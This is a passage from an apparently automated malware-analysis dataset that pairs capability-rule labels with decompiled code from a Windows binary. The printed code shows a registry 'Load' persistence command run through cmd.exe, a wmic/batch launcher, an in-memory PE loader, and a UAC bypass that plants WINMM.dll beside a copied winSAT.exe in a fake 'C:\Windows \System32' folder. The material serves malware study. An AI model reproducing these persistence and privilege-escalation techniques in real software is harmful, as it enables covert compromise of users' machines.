        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00410f61(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_11ch;\n    int32_t var_118h;\n    int32_t var_114h;\n    int32_t var_10ch;\n    uint var_8h;\n    uint var_2h;\n    \n    var_11ch = 0x11c;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x419c38);\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"RtlGetVersion\");\n        if (pcVar2 == NULL) {\n            return 0;\n        }\n        (*pcVar2)(&var_11ch);\n    }\n    if (var_10ch == 2) {\n        if (var_2h == '\\x01') {\n            if (var_118h == 5) {\n                if (var_114h == 0) {\n                    return var_8h + 500;\n                }\n                if (var_114h == 1) {\n                    return var_8h + 0x1fe;\n                }\n                if (var_114h == 2) {\n                    return var_8h + 0x208;\n                }\n            }\n            else if (var_118h == 6) {\n                if (var_114h == 0) {\n                    return var_8h + 600;\n                }\n                if (var_114h == 1) {\n                    return var_8h + 0x262;\n                }\n                if (var_114h == 2) {\n                    return var_8h + 0x26c;\n                }\n                if (var_114h == 3) {\n                    return var_8h + 0x276;\n                }\n            }\n            else if ((var_118h == 10) && (var_114h == 0)) {\n                return var_8h + 1000;\n            }\n        }\n        else if ((var_2h == '\\x02') || (var_2h == '\\x03')) {\n            if (var_118h == 5) {\n                if (var_114h == 1) {\n                    return var_8h + 0x13ec;\n                }\n                if (var_114h == 2) {\n                    return var_8h + 0x1450;\n                }\n            }\n            else if (var_118h == 6) {\n                if (var_114h == 0) {\n                    return var_8h + 6000;\n                }\n                if (var_114h == 1) {\n                    return var_8h + 0x17d4;\n                }\n                if (var_114h == 2) {\n                    return var_8h + 0x1838;\n                }\n                if (var_114h == 3) {\n                    return var_8h + 0x189c;\n                }\n            }\n            else if ((var_118h == 10) && (var_114h == 0)) {\n                return var_8h + 10000;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 736
    },
    "0041111b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.0041111b(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t TokenInformation;\n    uint ReturnLength;\n    int32_t TokenHandle;\n    \n    TokenHandle = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &TokenHandle);\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n    iVar3 = 0;\n    if (iVar2 != 0) {\n        ReturnLength = 4;\n        iVar2 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n        if (iVar2 != 0) {\n            iVar3 = TokenInformation;\n        }\n    }\n    if (TokenHandle != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return iVar3 != 0;\n}\n",
        "token_count": 220
    },
    "0041135c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041135c(uint arg_8h, uint nNumberOfBytesToRead, uint dwMoveMethod)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    int32_t *in_ECX;\n    uint lpNumberOfBytesRead;\n    \n    if (*in_ECX != 0) {\n        fcn.0041178e();\n    }\n    lpNumberOfBytesRead = 0;\n    arg_8h_00 = fcn.00406045();\n    (*_sym.imp.KERNEL32.dll_SetFilePointer)(in_ECX[2], 0, 0, dwMoveMethod);\n    uVar1 = (*_sym.imp.KERNEL32.dll_ReadFile)(in_ECX[2], arg_8h_00, nNumberOfBytesToRead, &lpNumberOfBytesRead, 0);\n    fcn.004030cc(arg_8h_00, nNumberOfBytesToRead);\n    fcn.00406034();\n    if (*in_ECX != 0) {\n        (*_sym.imp.KERNEL32.dll_ReleaseMutex)(in_ECX[3]);\n    }\n    return uVar1;\n}\n",
        "token_count": 247
    },
    "00411644": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411644(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(param_1 + 8));\n        *(param_1 + 8) = 0;\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "004119bf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint16_t * __cdecl fcn.004119bf(uint16_t *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    int32_t in_ECX;\n    uint16_t *puVar3;\n    int32_t in_EDX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EDX != 0) {\n        do {\n            uVar2 = *arg_8h;\n            iVar4 = in_EDX + -1;\n            uVar1 = uVar2 >> 0xc;\n            piVar7 = (uVar2 & 0xfff) + in_ECX;\n            puVar3 = arg_8h;\n            if (uVar1 == 3) {\n                *piVar7 = *piVar7 + arg_ch;\n            }\n            else if (uVar1 == 1) {\n                *piVar7 = *piVar7 * 0x10000 + arg_ch >> 0x10;\n            }\n            else if (uVar1 == 4) {\n                puVar3 = arg_8h + 1;\n                iVar4 = in_EDX + -2;\n                if ((uVar2 & 2) == 0) {\n                    uVar2 = *piVar7;\n                    iVar5 = arg_ch + 0x8000 + *puVar3 + uVar2 * 0x10000;\n                    *piVar7 = iVar5 >> 0x10;\n                    uVar6 = iVar5 + uVar2 * -0x10000 >> 0x10;\n                    uVar2 = 1;\n                    if (uVar6 - (arg_ch >> 0x10) != 1) {\n                        if (uVar6 == arg_ch >> 0x10) goto code_r0x00411b20;\n                        uVar2 = 2;\n                    }\n                    *arg_8h = *arg_8h | uVar2;\n                }\n            }\n            else if (uVar1 == 2) {\n                *piVar7 = *piVar7 + arg_ch;\n            }\n            else if (((uVar1 != 0) && (uVar1 != 6)) && (uVar1 != 7)) {\n                if (uVar1 != 0xb) {\n                    return NULL;\n                }\n                puVar3 = arg_8h + 2;\n                uVar6 = *puVar3 * 0x10000;\n                uVar8 = uVar6 + arg_8h[1];\n                uVar9 = uVar8 + arg_ch;\n                *piVar7 = (uVar9 + 0x8000 >> 0x10 |\n                          (((*piVar7 << 0x10) * 0x10000 >> 0x20) + (*puVar3 >> 0x10) + CARRY4(uVar6, arg_8h[1]) +\n                           arg_10h + CARRY4(uVar8, arg_ch) + (0xffff7fff < uVar9)) * 0x10000) + 0x8000 >> 0x10;\n                iVar4 = in_EDX + -3;\n            }\ncode_r0x00411b20:\n            arg_8h = puVar3 + 1;\n            in_EDX = iVar4;\n        } while (iVar4 != 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 836
    },
    "00411ef1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00411ef1(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint32_t arg_8h;\n    int32_t iVar4;\n    int32_t iVar5;\n    bool bVar6;\n    ulong uVar7;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00411be3();\n    if ((iVar3 == 0) || (arg_8h = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, *(iVar3 + 0x50), 0x3000, 0x40),  arg_8h == 0)\n       ) {\n        arg_8h = 0;\n    }\n    else {\n        iVar4 = *(iVar3 + 0x14) + 0x18 + iVar3;\n        fcn.0040102c(arg_8h, param_1, *(iVar4 + 0x14));\n        uVar2 = 0;\n        bVar6 = *(iVar3 + 6) != 0;\n        while (bVar6) {\n            iVar5 = uVar2 * 0x28;\n            fcn.00401052(*(iVar5 + 0xc + iVar4) + arg_8h, 0, *(iVar5 + 8 + iVar4));\n            fcn.0040102c(*(iVar5 + 0xc + iVar4) + arg_8h, *(iVar5 + 0x14 + iVar4) + param_1, *(iVar5 + 0x10 + iVar4));\n            uVar2 = uVar2 + 1;\n            bVar6 = uVar2 < *(iVar3 + 6);\n        }\n        uVar7 = fcn.00411e1c();\n        cVar1 = fcn.00411c75(arg_8h - uVar7, ((arg_8h >> 0x1f) - (uVar7 >> 0x20)) - (arg_8h < uVar7));\n        if (((cVar1 != '\\0') && (cVar1 = fcn.00411ce3(),  cVar1 != '\\0')) && (param_2 != 0)) {\n            (*(*(iVar3 + 0x28) + arg_8h))(arg_8h, 1, 0);\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 564
    },
    "004124f2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004124f2(uint *lpValueName)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    if ((*in_ECX != 0) && (iVar1 = (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(*in_ECX, *lpValueName),  iVar1 == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 94
    },
    "00412514": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00412514(uint noname_0, uint *lpSubKey)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001, *lpSubKey, 0, 0, 1, 1, 0);\n    return iVar1 == 0;\n}\n",
        "token_count": 92
    },
    "00412554": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00412554(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*param_1);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 63
    },
    "004126dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004126dc(int32_t lpFileName, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_10h_00;\n    uint *puVar3;\n    int32_t *in_ECX;\n    uint noname_0;\n    uint extraout_ECX;\n    uint uVar4;\n    uchar *arg_8h;\n    uchar *arg_14h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint lpExistingFileName;\n    uint var_ch;\n    uint var_8h;\n    \n    var_14h = in_ECX;\n    fcn.004109a0();\n    fcn.004035b9();\n    iVar1 = fcn.00412514(noname_0, in_ECX + 4);\n    fcn.00412554();\n    uVar4 = 0;\n    if ((iVar1 != 0) && (lpFileName != 0)) {\n        uVar2 = fcn.00410c8a();\n        fcn.00403549(uVar2);\n        fcn.00405feb();\n        fcn.00410c3e();\n        fcn.0040373f(in_ECX + 0x13);\n        fcn.0040357c(0x4176a4);\n        fcn.00403447(&var_ch);\n        fcn.00405feb();\n        iVar1 = (*_sym.imp.KERNEL32.dll_CopyFileW)(lpExistingFileName, in_ECX[8]);\n        if (iVar1 == 0) goto code_r0x00412a66;\n        arg_14h = &stack0xffffffb0;\n        fcn.00403333(&stack0xffffffb0);\n        arg_8h = &stack0xffffffa4;\n        uVar4 = extraout_ECX;\n        uVar2 = extraout_ECX;\n        fcn.00405a61(&stack0xffffffa4);\n        fcn.004061f0(arg_8h, uVar4, uVar2, arg_14h);\n        fcn.00412612(0x80000001, in_ECX + 4, 0xf003f, 0);\n        fcn.004125df(in_ECX + 6, &var_24h, 3);\n        fcn.00403148();\n    }\n    if (*in_ECX == 0) {\n        fcn.00412612(0x80000001, in_ECX + 4, 0xf003f, 0);\n    }\n    if (arg_10h == NULL) {\ncode_r0x0041297c:\n        if (arg_ch != 0) {\n            arg_10h = in_ECX + 8;\n            if (lpFileName == 0) {\n                fcn.00403549(&lpExistingFileName);\n            }\n            fcn.00403666(&lpFileName);\n            fcn.00405feb();\n            iVar1 = fcn.00401085();\n            fcn.0040102c(iVar1, \n                         \"cmd.exe /c REG ADD \\\"HKCU\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\\\" /f /v Load /t REG_SZ /d \\\"\"\n                         , 0x68);\n            fcn.00403666(&lpFileName);\n            arg_10h_00 = fcn.00401133();\n            fcn.00405feb();\n            puVar3 = fcn.00403666(&lpFileName);\n            fcn.0040102c(iVar1 + 0x68, *puVar3, arg_10h_00);\n            fcn.00405feb();\n            fcn.0040102c(iVar1 + 0x68 + arg_10h_00, 0x41a0ec, 2);\n            (*_sym.imp.KERNEL32.dll_WinExec)();\n        }\n        fcn.004036f7(var_14h[8]);\n        uVar4 = fcn.004036f7(0x41a0f0);\n        fcn.00403447(uVar4);\n        fcn.00405feb();\n        (*_sym.imp.KERNEL32.dll_DeleteFileW)();\n        uVar4 = 1;\n    }\n    else {\n        (*_sym.imp.SHELL32.dll_SHGetKnownFolderPath)();\n        fcn.004036f7(var_1ch);\n        fcn.0040357c(L\"\\\\programs.bat\");\n        fcn.004036f7(L\"for /F \\\"usebackq tokens=*\\\" %%A in (\\\"\");\n        fcn.0040357c(var_ch);\n        fcn.0040357c(var_ch);\n        fcn.0040357c(var_ch);\n        fcn.00403666(&var_20h);\n        fcn.00403666(&var_18h);\n        uVar4 = fcn.00403373();\n        fcn.004133b6(uVar4);\n        fcn.00405feb();\n        fcn.00405feb();\n        fcn.00410c8a();\n        fcn.0040357c(L\":ApplicationData\");\n        fcn.004036f7(L\"wmic process call create \\'\\\"\");\n        uVar4 = var_18h;\n        fcn.0040357c(var_18h);\n        fcn.0040357c(uVar4);\n        fcn.0040357c(L\":start\");\n        fcn.00403666(&var_18h);\n        fcn.00403666(&var_20h);\n        uVar4 = fcn.00403373();\n        fcn.004133b6(uVar4);\n        fcn.00405feb();\n        fcn.00405feb();\n        uVar4 = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_CopyFileW)(lpExistingFileName, var_18h, 0);\n        if (iVar1 != 0) {\n            fcn.00405feb();\n            arg_10h = NULL;\n            fcn.00405feb();\n            fcn.00405feb();\n            var_8h = 0;\n            fcn.00405feb();\n            in_ECX = var_14h;\n            goto code_r0x0041297c;\n        }\n        fcn.00405feb();\n        arg_10h = NULL;\n        fcn.00405feb();\n        fcn.00405feb();\n        var_8h = 0;\n    }\n    fcn.00405feb();\ncode_r0x00412a66:\n    fcn.00405feb();\n    fcn.00405feb();\n    return uVar4;\n}\n",
        "token_count": 1493
    },
    "00412a7f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412a7f(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint uVar3;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uchar *arg_8h_00;\n    uint *arg_8h_01;\n    uint arg_8h_02;\n    uint uVar4;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    \n    iVar1 = arg_8h;\n    fcn.00402446(arg_8h);\n    iVar2 = fcn.0041111b();\n    if (iVar2 == 1) {\n        uVar4 = 0x23;\n        uVar3 = 0x80000002;\n    }\n    else {\n        uVar4 = 0x1a;\n        uVar3 = 0x80000001;\n    }\n    *(in_ECX + 8) = uVar3;\n    *(in_ECX + 0xc) = uVar4;\n    uVar3 = fcn.004036f7(L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\\");\n    fcn.00403549(uVar3);\n    fcn.00405feb();\n    fcn.0040373f(iVar1 + 0x30);\n    fcn.00403447(&arg_8h);\n    fcn.00405feb();\n    uVar3 = fcn.004036f7(L\"inst\");\n    fcn.00403549(uVar3);\n    fcn.00405feb();\n    uVar3 = fcn.004036f7(L\"InitWindows\");\n    fcn.00403549(uVar3);\n    fcn.00405feb();\n    uVar3 = fcn.004036f7(L\"Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\");\n    fcn.00403549(uVar3);\n    fcn.00405feb();\n    iVar2 = fcn.00412612(0x80000001, in_ECX + 0x10, 0xf003f, 0);\n    *(in_ECX + 0x24) = iVar2;\n    if (iVar2 != 0) {\n        var_ch = 0;\n        var_8h = 0;\n        if (*(iVar1 + 0x18) != 0) {\n            iVar2 = fcn.00412569(in_ECX + 0x18, &var_ch);\n            if (iVar2 == 0) {\n                *(in_ECX + 0x28) = 0;\n            }\n            else {\n                arg_8h_01 = &var_ch;\n                arg_8h_02 = extraout_ECX;\n                fcn.0040315e(arg_8h_01);\n                arg_8h_00 = &stack0xffffff7c;\n                uVar3 = extraout_ECX_00;\n                uVar4 = extraout_ECX_00;\n                fcn.00405a61(&stack0xffffff7c);\n                fcn.004061f0(arg_8h_00, uVar3, uVar4, arg_8h_01);\n                uVar3 = fcn.0040300a(arg_8h_02);\n                fcn.00403549(uVar3);\n                fcn.00405feb();\n                arg_8h = 0;\n                fcn.00403148();\n                *(in_ECX + 0x28) = 1;\n            }\n        }\n        if (*(iVar1 + 0x20) != 0) {\n            uVar3 = fcn.004109a0();\n            fcn.00403549(uVar3);\n            fcn.00405feb();\n        }\n        fcn.00403148();\n    }\n    return;\n}\n",
        "token_count": 850
    },
    "00412c34": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412c34(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_ch_00;\n    int32_t *in_ECX;\n    uint *arg_8h_00;\n    uint var_8h;\n    \n    if (*in_ECX != 0) {\n        arg_8h_00 = &var_8h;\n        arg_ch_00 = fcn.00403333(arg_8h_00);\n        fcn.004125df(arg_8h, arg_ch_00, arg_8h_00);\n        fcn.00403148();\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "00412f0d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.00412f0d(void)\n\n{\n    int32_t iVar1;\n    uint phkResult;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001, 0x41a270, 0, 0xf003f, &phkResult);\n    if (iVar1 == 2) {\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001, 0x41a270, 0, 0, 0, 0xf003f, 0, &phkResult, 0);\n    }\n    return phkResult;\n}\n",
        "token_count": 147
    },
    "00412f55": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: OldValue\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint fcn.00412f55(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t unaff_ESI;\n    uint lpFilename;\n    uint var_1048h;\n    uint var_848h;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uint *puStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint *puStack180;\n    uint uStack176;\n    char16_t *pcStack172;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint *puStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint *puStack116;\n    uint uStack112;\n    uint *puStack108;\n    char16_t *pcStack104;\n    uint uStack100;\n    uint *puStack96;\n    char16_t *pcStack92;\n    uint uStack88;\n    char16_t *pcStack84;\n    uint uStack80;\n    char16_t *pExecInfo;\n    uint uStack72;\n    uint *var_40h;\n    char16_t *pcStack64;\n    char16_t *var_38h;\n    char16_t *var_34h;\n    uint *var_30h;\n    char16_t *var_2ch;\n    uint *puStack44;\n    uint uStack40;\n    uint *puStack36;\n    uint *puStack32;\n    uint uStack28;\n    uint *puStack24;\n    uint uStack20;\n    uint var_ch;\n    int32_t var_8h;\n    uint OldValue;\n    \n    OldValue = 0x412f62;\n    fcn.004011c0();\n    uStack20 = 0x412f6a;\n    var_8h = unaff_ESI;\n    iVar4 = fcn.0041111b();\n    pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n    if (iVar4 != 1) {\n        uStack20 = *0x559cb0;\n        puStack24 = 0x412f81;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        puStack24 = 0x3c;\n        puStack32 = &fcn.00412f55::pExecInfo;\n        uStack28 = 0;\n        puStack36 = 0x412f8f;\n        fcn.00401052();\n        OldValue = 0;\n        puStack24 = &fcn.00412f55::OldValue;\n        uStack28 = 0x412f9f;\n        (*_sym.imp.KERNEL32.dll_Wow64DisableWow64FsRedirection)();\n        puStack36 = &fcn.00412f55::lpFilename;\n        uStack28 = 0x800;\n        puStack32 = NULL;\n        uStack40 = 0x412fb2;\n        fcn.00401052();\n        puStack32 = &fcn.00412f55::lpFilename;\n        uStack28 = 0x800;\n        puStack36 = NULL;\n        uStack40 = 0x412fc4;\n        (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)();\n        uStack40 = 0x800;\n        var_2ch = &fcn.00412f55::var_848h;\n        puStack44 = NULL;\n        var_30h = 0x412fd2;\n        fcn.00401052();\n        pcVar1 = _sym.imp.KERNEL32.dll_GetSystemDirectoryW;\n        puStack44 = &fcn.00412f55::var_848h;\n        uStack40 = 0x800;\n        var_2ch = 0x412fe5;\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)();\n        pcVar3 = _sym.imp.KERNEL32.dll_lstrcatW;\n        var_30h = &fcn.00412f55::var_848h;\n        var_2ch = L\"\\\\winSAT.exe\";\n        var_34h = 0x412ff9;\n        (*_sym.imp.KERNEL32.dll_lstrcatW)();\n        var_34h = 0x800;\n        pcStack64 = &fcn.00412f55::var_1048h;\n        var_38h = NULL;\n        var_40h = 0x41300c;\n        fcn.00401052();\n        var_38h = &fcn.00412f55::var_1048h;\n        var_34h = 0x800;\n        pcStack64 = 0x41301d;\n        (*pcVar1)();\n        pcStack64 = L\"\\\\winmm.dll\";\n        var_40h = &fcn.00412f55::var_1048h;\n        uStack72 = 0x41302b;\n        (*pcVar3)();\n        pcVar1 = _sym.imp.KERNEL32.dll_CreateDirectoryW;\n        uStack72 = 0;\n        pExecInfo = L\"\\\\\\\\?\\\\C:\\\\Windows \\\\\";\n        uStack80 = 0x41303b;\n        (*_sym.imp.KERNEL32.dll_CreateDirectoryW)();\n        uStack80 = 0;\n        pcStack84 = L\"\\\\\\\\?\\\\C:\\\\Windows \\\\System32\";\n        uStack88 = 0x413043;\n        (*pcVar1)();\n        pcVar1 = _sym.imp.KERNEL32.dll_CopyFileW;\n        puStack96 = &fcn.00412f55::var_848h;\n        uStack88 = 0;\n        pcStack92 = L\"\\\\\\\\?\\\\C:\\\\Windows \\\\System32\\\\winSAT.exe\";\n        uStack100 = 0x413058;\n        (*_sym.imp.KERNEL32.dll_CopyFileW)();\n        uStack100 = 0;\n        pcStack104 = L\"\\\\\\\\?\\\\C:\\\\Windows \\\\System32\\\\winmmd.dll\";\n        puStack108 = &fcn.00412f55::var_1048h;\n        uStack112 = 0x413067;\n        (*pcVar1)();\n        uStack112 = 0x41306c;\n        uVar5 = fcn.00412f0d();\n        puStack116 = &fcn.00412f55::lpFilename;\n        uStack112 = 0x1000;\n        uStack120 = 1;\n        uStack124 = 0;\n        uStack128 = 0x41a2b4;\n        uStack136 = 0x413089;\n        uStack132 = uVar5;\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)();\n        puStack140 = 0x413090;\n        uStack136 = uVar5;\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n        puStack140 = &fcn.00412f55::var_8h;\n        uStack144 = 0x41309a;\n        uStack144 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        uStack148 = 0x4130a1;\n        (*_sym.imp.KERNEL32.dll_IsWow64Process)();\n        uStack148 = 0;\n        uStack152 = 0;\n        uStack156 = 2;\n        uStack160 = 0;\n        uStack164 = 0;\n        uStack168 = 0x40000000;\n        pcStack172 = L\"\\\\\\\\?\\\\C:\\\\Windows \\\\System32\\\\WINMM.dll\";\n        if (var_8h == 0) {\n            uStack176 = 0x4130bc;\n            uVar5 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n            uStack184 = 0x2e00;\n            uStack188 = 0x423408;\n        }\n        else {\n            uStack176 = 0x4130d5;\n            uVar5 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n            uStack184 = 0x3000;\n            uStack188 = 0x420408;\n        }\n        puStack180 = &fcn.00412f55::var_ch;\n        uStack176 = 0;\n        uStack196 = 0x4130ed;\n        uStack192 = uVar5;\n        (*_sym.imp.KERNEL32.dll_WriteFile)();\n        puStack200 = 0x4130f0;\n        uStack196 = uVar5;\n        (*pcVar2)();\n        puStack200 = &fcn.00412f55::pExecInfo;\n        pExecInfo = 0x3c;\n        var_38h = L\"C:\\\\Windows \\\\System32\\\\winSAT.exe\";\n        var_34h = L\"formal\";\n        var_2ch = NULL;\n        var_40h = NULL;\n        var_30h = NULL;\n        uStack204 = 0x413118;\n        (*_sym.imp.SHELL32.dll_ShellExecuteExW)();\n        uStack204 = OldValue;\n        uStack208 = 0x413121;\n        (*_sym.imp.KERNEL32.dll_Wow64RevertWow64FsRedirection)();\n        uStack208 = 2000;\n        uStack212 = 0x41312c;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n        uStack212 = 0;\n        uStack216 = 0x413133;\n        (*_sym.imp.KERNEL32.dll_ExitProcess)();\n    }\n    return 0;\n}\n",
        "token_count": 2172
    },
    "0041313a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
